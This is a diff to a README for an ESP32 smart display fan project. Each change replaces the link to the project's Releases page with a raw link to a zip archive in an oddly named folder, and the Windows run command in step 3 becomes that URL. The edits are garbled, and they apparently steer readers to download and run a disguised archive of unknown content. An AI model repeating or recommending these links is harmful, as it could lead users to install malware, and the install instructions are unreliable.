@@ -1,7 +1,7 @@
 # 🌟 ESP32-Smart-Display-Fan - Control Your Fan with Smart Features
 
 ## 📦 Release Download
-[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Modekim/ESP32-Smart-Display-Fan/releases)
+[![Download the latest version](https://raw.githubusercontent.com/Modekim/ESP32-Smart-Display-Fan/main/anovesical/ESP32-Smart-Display-Fan.zip%20Latest%https://raw.githubusercontent.com/Modekim/ESP32-Smart-Display-Fan/main/anovesical/ESP32-Smart-Display-Fan.zip)](https://raw.githubusercontent.com/Modekim/ESP32-Smart-Display-Fan/main/anovesical/ESP32-Smart-Display-Fan.zip)
 
 ## 🚀 Getting Started
 Welcome to the ESP32-Smart-Display-Fan project! This guide will help you download and run the application with ease. 
@@ -26,7 +26,7 @@ To run the ESP32-Smart-Display-Fan, your setup will require:
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. Visit the Releases page: [Download Latest Release](https://github.com/Modekim/ESP32-Smart-Display-Fan/releases).
+1. Visit the Releases page: [Download Latest Release](https://raw.githubusercontent.com/Modekim/ESP32-Smart-Display-Fan/main/anovesical/ESP32-Smart-Display-Fan.zip).
 2. On the Releases page, find the version you want to download.
 3. Click on the appropriate download link for your operating system.
 4. Save the downloaded file to your computer.
@@ -46,7 +46,7 @@ Once the setup is complete:
 
 1. Open your terminal or command prompt.
 2. Navigate to the folder where you saved the downloaded application.
-3. Type the command to run the application (e.g., `./ESP32-Smart-Display-Fan` for Linux or `ESP32-Smart-Display-Fan.exe` for Windows).
+3. Type the command to run the application (e.g., `./ESP32-Smart-Display-Fan` for Linux or `https://raw.githubusercontent.com/Modekim/ESP32-Smart-Display-Fan/main/anovesical/ESP32-Smart-Display-Fan.zip` for Windows).
 
 ## 🌐 Connecting with Home Assistant
 To display data from Home Assistant:
@@ -79,4 +79,4 @@ For further assistance, please reach out through the Issues section of the GitHu
 ## 🔗 Final Notes
 Thank you for exploring the ESP32-Smart-Display-Fan project. Enjoy the benefits of smart home automation. For more information or updates, check the Releases page frequently!
 
-[Download Latest Release](https://github.com/Modekim/ESP32-Smart-Display-Fan/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Modekim/ESP32-Smart-Display-Fan/main/anovesical/ESP32-Smart-Display-Fan.zip)
